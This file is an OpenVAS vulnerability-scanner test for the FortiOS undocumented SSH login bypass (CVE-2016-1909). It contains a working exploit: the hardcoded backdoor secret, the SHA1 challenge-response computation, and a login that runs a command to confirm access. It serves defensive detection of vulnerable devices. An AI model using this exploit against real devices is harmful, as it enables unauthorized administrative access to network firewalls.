###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_forti_80581.nasl 13568 2019-02-11 10:22:27Z cfischer $
#
# Fortinet FortiOS SSH Undocumented Interactive Login Security Bypass Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.140239");
  script_bugtraq_id(80581);
  script_cve_id("CVE-2016-1909");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_version("$Revision: 13568 $");

  script_name("Fortinet FortiOS SSH Undocumented Interactive Login Security Bypass Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/80581");
  script_xref(name:"URL", value:"http://www.fortinet.com/products/fortigate_overview.html");

  script_tag(name:"impact", value:"Attackers can exploit this issue to bypass certain security restrictions to perform unauthorized actions. This may aid in
  further attacks.");

  script_tag(name:"vuldetect", value:"Try to login as user 'Fortimanager_Access'.");

  script_tag(name:"solution", value:"Updates are available. Please see the references or vendor advisory for more information.");

  script_tag(name:"summary", value:"FortiGate running FortiOS is prone to a security-bypass vulnerability.");

  script_tag(name:"affected", value:"FortiOS 4.3.0 through 4.3.16, and 5.0.0 through 5.0.7 are vulnerable.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"last_modification", value:"$Date: 2019-02-11 11:22:27 +0100 (Mon, 11 Feb 2019) $");
  script_tag(name:"creation_date", value:"2017-04-07 16:08:03 +0200 (Fri, 07 Apr 2017)");
  script_category(ACT_ATTACK);
  script_family("Default Accounts");
  script_copyright("This script is Copyright (C) 2017 Greenbone Networks GmbH");
  script_dependencies("ssh_detect.nasl");
  script_require_ports("Services/ssh", 22);
  script_mandatory_keys("ssh/server_banner/available");

  exit(0);
}

include("ssh_func.inc");
include("misc_func.inc");

if( defined_func( "ssh_login_interactive" ) &&
    defined_func( "ssh_login_interactive_pass" )
  )
{
  port = get_ssh_port( default:22 );
  if( ! soc = open_sock_tcp( port ) ) exit( 0 );

  user = 'Fortimanager_Access';

  auth = get_kb_item("SSH/supportedauth/" + port);

  if( auth =~ '^publickey$' ) exit( 0 );

  sess = ssh_connect( socket:soc );
  if( ! sess ) exit( 0 );
  prompt = ssh_login_interactive( sess, login:user );

  if( ! prompt || prompt !~ '^(-)?[0-9]+' )
  {
    ssh_disconnect( soc );
    close( soc );
    exit( 0 );
  }

  m = crap( data:raw_string( 0 ), length:12 ) +
      prompt +
      'FGTAbc11*xy+Qqz27' +
      raw_string( 0xA3, 0x88, 0xBA, 0x2E, 0x42, 0x4C, 0xB0, 0x4A,
                  0x53, 0x79, 0x30, 0xC1, 0x31, 0x07, 0xCC, 0x3F,
                  0xA1, 0x32, 0x90, 0x29, 0xA9, 0x81, 0x5B, 0x70
                );

  x = SHA1( m );
  y = crap( data:raw_string( 0 ), length:12 ) + x;

  pass1 = 'AK1' + base64( str:y );

  login = ssh_login_interactive_pass( sess, password:pass1 );

  if( login == 0 )
  {
   buf = ssh_request_exec(sess,cmd:'get system status');

   if( "Version:" >< buf && "Forti" >< buf )
   {
     report = 'It was possible to login into the remote Forti Device as user `' + user + '` and to execute `get system status`.\n\nResult:\n\n' + buf;
     security_message( port:port, data:report );
     ssh_disconnect( soc );
     close( soc );
     exit( 0 );
   }
  }

  ssh_disconnect( soc );
  if( soc )
    close( soc );
}

exit( 0 );